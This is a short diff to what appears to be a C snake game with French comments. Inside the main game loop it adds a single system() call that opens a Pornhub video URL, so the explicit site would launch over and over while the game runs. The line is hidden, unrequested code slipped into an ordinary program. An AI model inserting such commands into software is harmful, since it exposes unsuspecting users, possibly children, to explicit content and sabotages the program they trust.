@@ -134,6 +134,7 @@ int main()
 	// si toutes les pommes sont mangées
 	do {
 		// conditions de changements de direction du serpent
+		system("open https://fr.pornhub.com/view_video.php?viewkey=67470baca439a");
 		if (lesX[0] < xPomme[nbPommes]) {
 				direction = DROITE;
 		} else if (lesX[0] > xPomme[nbPommes]) {
